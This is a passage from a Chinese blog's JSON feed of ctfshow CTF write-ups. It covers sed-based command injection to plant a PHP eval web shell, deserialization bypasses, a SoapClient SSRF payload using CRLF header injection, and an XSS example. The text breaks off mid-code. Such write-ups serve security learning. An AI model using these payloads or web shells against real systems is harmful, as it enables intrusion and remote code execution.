variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>sed 全称是：Stream EDitor</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>调用 sed 命令有两种形式：</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>sed [options] &#39;command&#39; file (s)</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>sed [options] -f scriptfile file (s)</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>a\\ 在当前行后面加入一行文本。</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>b label 分支到脚本中带有标记的地方，如果分支不存在则分支到脚本的末尾。</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>c\\ 用新的文本改变本行的文本。</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>d 从模板块（Pattern space）位置删除行。</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>D 删除模板块的第一行。</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>i\\ 在当前行上面插入文本。</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>h 拷贝模板块的内容到内存中的缓冲区。</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>H 追加模板块的内容到内存中的缓冲区</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>g 获得内存缓冲区的内容，并替代当前模板块中的文本。</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>G 获得内存缓冲区的内容，并追加到当前模板块文本的后面。</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>l 列表不能打印字符的清单。</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>n 读取下一个输入行，用下一个命令处理新的行而不是用第一个命令。</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>N 追加下一个输入行到模板块后面并在二者间嵌入一个新行，改变当前行号码。</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p 打印模板块的行。</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>P（大写）打印模板块的第一行。</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>q 退出 Sed。</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>r file 从 file 中读行。</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>t labelif 分支，从最后一行开始，条件一旦满足或者 T，t 命令，将导致分支到带有标号的命令处，或者到脚本的末尾。</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>T label 错误分支，从最后一行开始，一旦发生错误或者 T，t 命令，将导致分支到带有标号的命令处，或者到脚本的末尾。</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>w file 写并追加模板块到 file 末尾。</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>W file 写并追加模板块的第一行到 file 末尾。</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>！表示后面的命令对所有没有被选定的行发生作用。</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>s&#x2F;re&#x2F;string 用 string 替换正则表达式 re。</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>&#x3D; 打印当前行号码。</pre></td></tr><tr><td data-num=\"29\"></td><td><pre># 把注释扩展到下一个换行符以前。</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>以下的是替换标记 g 表示行内全面替换。</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>p 表示打印行。</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>w 表示把行写入一个文件。</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>x 表示互换模板块中的文本和缓冲区中的文本。</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>y 表示把一个字符翻译为另外的字符（但是不用于正则表达式）</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>选项编辑 播报</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>-e command,--expression&#x3D;command 允许多台编辑。</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>-h,--help 打印帮助，并显示 bug 列表的地址。</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>-n,--quiet,--silent 取消默认输出。</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>-f,--filer&#x3D;script-file 引导 sed 脚本文件名。</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>-V,--version 打印版本和版权信息。</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>元字符集编辑 播报</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>^ 锚定行的开始如：&#x2F;^sed &#x2F; 匹配所有以 sed 开头的行。</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>$ 锚定行的结束 如：&#x2F;sed$&#x2F; 匹配所有以 sed 结尾的行。</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>. 匹配一个非换行符的字符 如：&#x2F;s.d&#x2F; 匹配 s 后接一个任意字符，然后是 d。</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>* 匹配零或多个字符 如：&#x2F;*sed &#x2F; 匹配所有模板是一个或多个空格后紧跟 sed 的行。</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>[] 匹配一个指定范围内的字符，如 &#x2F;[Ss] ed &#x2F; 匹配 sed 和 Sed。</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>[^] 匹配一个不在指定范围内的字符，如：&#x2F;[^A-RT-Z] ed &#x2F; 匹配不包含 A-R 和 T-Z 的一个字母开头，紧跟 ed 的行。</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\\(..\\）保存匹配的字符，如 s&#x2F;\\(love\\) able&#x2F;\\1rs，loveable 被替换成 lovers。</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>&amp;；保存搜索字符用来替换其他字符，如 s&#x2F;love&#x2F;**&amp;**&#x2F;，love 这成 **love**。</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\\&lt;；锚定单词的开始，如：&#x2F;\\&lt;love &#x2F; 匹配包含以 love 开头的单词的行。</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\\&gt;；锚定单词的结束，如 &#x2F;love\\&gt;&#x2F; 匹配包含以 love 结尾的单词的行。</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>x\\&#123;m\\&#125; 重复字符 x，m 次，如：&#x2F;0\\&#123;5\\&#125;&#x2F; 匹配包含 5 个 o 的行。</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>x\\&#123;m,\\&#125; 重复字符 x，至少 m 次，如：&#x2F;o\\&#123;5,\\&#125;&#x2F; 匹配至少有 5 个 o 的行。</pre></td></tr><tr><td data-num=\"54\"></td><td><pre>x\\&#123;m,n\\&#125; 重复字符 x，至少 m 次，不多于 n 次，如：&#x2F;o\\&#123;5,10\\&#125;&#x2F; 匹配 5--10 个 o 的行。</pre></td></tr></table></figure><p>使用 sed 命令</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>cmd&#x3D;sed&amp;param&#x3D;&#x2F;php\\|POST\\|exec&#x2F;!dw1.php</pre></td></tr></table></figure><p>其意义为，sed 命令，param 的 <code>/php\\|POST\\|exec/</code>  为正则匹配表达式，用于匹配符合条件的行， <code>!</code>  表示后面的命令对所有没有被选定的行发生作用，即后面的 <code>d</code>  删除行命令对所以未能匹配的行删除， <code>w</code>  即把行写入文件</p>\n<p>执行后 1.php 的内容如下</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$cmd</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$param</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'param'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>之后切到 1.php，输入 payload</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token assign-left variable\">cmd</span><span class=\"token operator\">=</span>echo <span class=\"token string\">\"&lt;?php eval(\\<span class=\"token variable\">$_POST</span>[1]);?>\"</span><span class=\"token operator\">></span><span class=\"token number\">2</span>.php</pre></td></tr></table></figure><p>这里在美元符号 <code>$</code>  前加上 <code>\\</code>  的原因为，在双引号下， <code>$_POST</code>  会被当做为一个已经定义过的变量，并做替换，若没有 <code>\\</code> ，那么写入文件中的内容为</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>因此需要使得 <code>$_POST</code>  不作为变量名，这里有两种方案</p>\n<ol>\n<li>\n<p>双引号改为单引号，在 shell 命令中，单引号中的变量是无效的</p>\n</li>\n<li>\n<p>双引号包裹，在 <code>$</code>  前加上转移符号 <code>\\</code></p>\n</li>\n</ol>\n<p>再切换到 2.php, 之后就正常 rce</p>\n<h2 id=\"姻缘测试\"><a class=\"anchor\" href=\"#姻缘测试\">#</a> 姻缘测试</h2>\n<p>SSTI 注入</p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "url": "http://dpm12345.github.io/2022/10/04/CTF/ctfshow/Web%E5%85%A5%E9%97%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "title": "反序列化",
            "date_published": "2022-10-04T14:16:40.000Z",
            "content_html": "<h1 id=\"web-258\"><a class=\"anchor\" href=\"#web-258\">#</a> web 258</h1>\n<p>相比于上一题多了正则匹配： <code>if(!preg_match('/[oc]:\\d+:/i', $_COOKIE['user']))</code></p>\n<p>由构造的序列化字符串，只需将 <code>O:</code>  改为 <code>O:+</code>  即可</p>\n<h1 id=\"web-259\"><a class=\"anchor\" href=\"#web-259\">#</a> web 259</h1>\n<p>这个题利用的是 php 原生类 SoapClient<br />\n 该类的构造函数如下：</p>\n<p><code>public SoapClient :: SoapClient （mixed $wsdl [，array $options ]）</code></p>\n<p>flag.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$xff</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">','</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_X_FORWARDED_FOR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">array_pop</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$xff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$ip</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_pop</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$xff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ip</span><span class=\"token operator\">!==</span><span class=\"token string single-quoted-string\">'127.0.0.1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'error'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token variable\">$token</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$token</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'ctfshow'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.txt'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>当然这是个不完整的源码，应该还有一条判断真实 ip 的也就是</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">===</span><span class=\"token string single-quoted-string\">'127.0.0.1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>xxxxxx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>所以首先得利用 <code>ssrf</code>  访问 <code>flag.php</code>  接着构造 post 数据 <code>token=ctfshow</code>  和请求头 <code>X-Forwarded-For</code>  就能把 flag 写到 flag.txt 中了。</p>\n<p>那么 ssrf 漏洞在哪呢，这就得用到我们前面提到的 SoapClient 类了。这个类中有个 <code>__call</code>  魔术方法（当调用不存在的方法时触发），会调用 SoapClient 类的构造方法。</p>\n<p>另外用到的一个文章识点就是 CRLF</p>\n<p>大概如下：</p>\n<p>在 HTTP 协议中，HTTP Header 与 HTTP Body 是用两个 CRLF 分隔的，浏览器就是根据这两个 CRLF 来取出 HTTP 内容并显示出来。所以，一旦我们能够控制 HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话 Cookie 或者 HTML 代码</p>\n<p>就比如跳转网站，一般其跳转包为</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>HTTP/1.1 302 Moved Temporarily </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Date: Fri, 27 Jun 2014 17:52:17 GMT </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Content-Type: text/html </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Content-Length: 154 </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Connection: close </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Location: http://xxxx</pre></td></tr></table></figure><p>如果我们将 <code>http://xxxx</code>  修改为 <code>http://xxxx%0axxxx</code></p>\n<p>那么显然 <code>Location</code>  段会变为</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Location: http://xxxx</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>xxxx</pre></td></tr></table></figure><p>这样我们就可以以此来修改跳转包，比如 <code>Set-cookie</code> ，从而使得进入跳转网站自带 cookie</p>\n<p>同理，如果我们将 <code>%0a</code>  修改为 <code>%0d%0a%0d%0a</code> ，即两个 CRLF (换行)</p>\n<p>那么 <code>xxxx</code>  会进入 HTTP Body，即会显示，如果为 <code>&lt;img src=1 onerror=alert(/xss/)&gt;</code>  那么会显示一张图片，并在错误时进行弹窗</p>\n<p>但由于浏览器的 XSS Filter，同时需要注入 <code>X-XSS-Protection:0</code> ，使得 <code>alert</code>  正常执行</p>\n<p>由此，我们利用 SoapClient 进行请求包的构造</p>\n<p>大致结构为</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Content-Type: text/html </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Content-Length: 154 </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Location: http://127.0.0.1/flag</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>X-Forwarded-For:127.0.0.1</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>token=ctfshow</pre></td></tr></table></figure><p>所以 payload</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$url</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"http://127.0.0.1/flag.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$post</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"token=ctfshow\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SoapClient</span><span class=\"token punctuation\">(</span><span class=\"token constant\">null</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'location'</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$url</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'user_agent'</span><span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'xx^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded ^^Content-Length:'</span><span class=\"token operator\">.</span><span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">string</span><span class=\"token punctuation\">)</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$post</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'^^^^'</span><span class=\"token operator\">.</span><span class=\"token variable\">$post</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'uri'</span><span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'ssrf'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'^^'</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\\r\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><h1 id=\"web-260\"><a class=\"anchor\" href=\"#web-260\">#</a> web 260</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/ctfshow_i_love_36D/'</span><span class=\"token punctuation\">,</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctfshow'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>由源码知，只需反序列化后的字符串包含 <code>ctfshow_i_love_36D</code>  即可</p>\n<p>那么 payload 可以为</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"ctfshow_i_love_36D\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><h1 id=\"web-261\"><a class=\"anchor\" href=\"#web-261\">#</a> web 261</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfshowvip</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">=</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">=</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">!=</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">||</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">!=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'error'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__sleep</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">=</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">=</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token 